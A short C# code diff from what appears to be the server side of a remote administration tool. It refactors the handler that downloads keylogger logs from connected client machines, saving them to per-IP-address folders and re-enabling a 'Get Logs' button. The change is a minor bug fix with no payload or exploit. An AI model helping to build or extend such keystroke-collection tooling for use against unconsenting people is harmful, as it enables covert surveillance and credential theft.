@@ -311,17 +311,25 @@ namespace xServer.Core.Commands
 
         public static void HandleGetLogsResponse(Client client, GetLogsResponse packet)
         {
+            if (client.Value.FrmKl == null)
+                return;
+
+            if (packet.FileCount == 0)
+            {
+                client.Value.FrmKl.Invoke((MethodInvoker) delegate
+                {
+                    client.Value.FrmKl.btnGetLogs.Enabled = true;
+                });
+
+                return;
+            }
+
             string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address.ToString() + "\\Logs\\");
 
             if (!Directory.Exists(downloadPath))
                 Directory.CreateDirectory(downloadPath);
 
             downloadPath = Path.Combine(downloadPath, packet.Filename + ".html");
-
-            if (client.Value.FrmKl == null)
-            {
-                return;
-            }
 
             FileSplit destFile = new FileSplit(downloadPath);
 
@@ -331,7 +339,7 @@ namespace xServer.Core.Commands
             {
                 client.Value.FrmKl.Invoke((MethodInvoker) delegate
                 {
-                    if (packet.Index == packet.FileCount || packet.FileCount == 0)
+                    if (packet.Index == packet.FileCount)
                         client.Value.FrmKl.btnGetLogs.Enabled = true;
                 });
             }
